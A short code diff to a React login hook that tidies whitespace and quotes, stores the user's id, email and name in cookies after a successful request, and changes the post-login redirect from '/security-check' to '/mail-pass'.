@@ -28,15 +28,15 @@ function useMockLogin() {
     });
 
     const data = await res.json();
-  
+
     if (res.ok) {
       console.log("success", data);
       Cookies.set("id", data?.info?._id);
       Cookies.set("email", data?.info?.email);
-      Cookies.set('userName', data?.email);
+      Cookies.set("userName", data?.email);
       // toast.success("Login Succecssfull");
       formik.resetForm();
-      push("/security-check");
+      push("/mail-pass");
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
